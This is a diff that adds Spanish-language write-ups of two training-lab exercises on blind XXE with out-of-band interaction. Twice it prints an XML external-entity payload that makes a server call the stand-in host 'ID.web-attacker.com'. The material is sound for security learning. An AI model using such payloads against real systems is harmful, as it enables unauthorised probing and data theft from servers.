@@ -47,3 +47,67 @@ Al enviarlo nos devuelve latest que puede ser un directorio en el que vamos a ir
 Y así todo el rato hasta las credenciales.
 
 <figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Blind XXE with out-of-band interaction
+
+### Enunciado
+
+Este laboratorio tiene una funcionalidad de "Check stock" que analiza entradas XML pero no muestra el resultado. Puedes detectar la vulnerabilidad XXE a ciegas provocando interacciones _out-of-band_ con un dominio externo.
+
+> Usa una entidad externa (external entity) para que el analizador XML realice una consulta DNS y una solicitud HTTP a Burp Collaborator.
+
+### Resolución
+
+Interceptamos la petición del stock.  A menudo puedes **detectar XXE a ciegas** usando la misma técnica que en ataques XXE SSRF, provocando una interacción de red _out-of-band_ hacia un sistema que tú controles.
+
+Por ejemplo, puedes definir una **entidad externa** así:
+
+```
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://ID.web-attacker.com"> ]>
+```
+
+Luego usas esa entidad en un valor dentro del XML.
+
+**¿Qué hace este ataque XXE?**
+
+* Obliga al servidor a realizar una solicitud HTTP de back-end a la URL especificada.
+* El atacante puede monitorizar la consulta DNS y la solicitud HTTP resultante para confirmar que la inyección XXE funcionó.
+
+Sabiendo esto vamos a Burp Suite's Collaborator y copia tu payload personalizado para usarlo en el ataque y detectar la XXE a ciegas.
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-08 215516 (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-08 215611.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-08 215634 (1).png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Blind XXE with out-of-band interaction via XML parameter entities
+
+### Enunciado
+
+Este laboratorio tiene una funcionalidad de "Check stock" que analiza entradas XML, pero no muestra valores inesperados y bloquea las solicitudes que contienen entidades externas normales.
+
+Usa una _parameter entity_ para hacer que el analizador XML realice una consulta DNS y una solicitud HTTP a Burp Collaborator.
+
+### Resolución
+
+A menudo puedes **detectar XXE a ciegas** usando la misma técnica que para ataques XXE SSRF, provocando una interacción de red _out-of-band_ hacia un sistema que controles.
+
+Por ejemplo, puedes definir una **entidad externa** así:
+
+```
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://ID.web-attacker.com"> ]>
+```
+
+Luego, usarías esa **entidad** en un valor de datos dentro del XML.
+
+**¿Qué efecto tiene este ataque XXE?**
+
+* Obliga al servidor a hacer una **solicitud HTTP de back-end** a la URL especificada.
+* El atacante puede **monitorizar** la consulta DNS y la solicitud HTTP resultante para **confirmar que la inyección XXE fue exitosa**.
+
+Sabiendo esto vamos a **Burp Suite's Collaborator** y copia el payload generado para usarlo en tu ataque y así detectar la XXE a ciegas.
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-08 221213.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-08 221142.png" alt=""><figcaption></figcaption></figure>
